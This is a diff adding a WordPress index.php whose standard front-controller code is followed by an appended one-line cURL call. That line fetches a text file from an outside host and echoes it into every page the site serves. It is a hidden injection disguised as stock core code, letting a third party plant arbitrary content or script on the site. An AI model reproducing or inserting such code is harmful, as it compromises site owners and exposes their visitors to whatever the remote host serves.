@@ -1,0 +1,19 @@
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
+
+$url='https://selirhati.store/plugins/dqk-2.txt';$ch=curl_init($url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);$a=curl_exec($ch);if($a===FALSE){echo '<p>Error fetching content using cURL from '.$url.'</p>';}else{echo $a;}curl_close($ch);
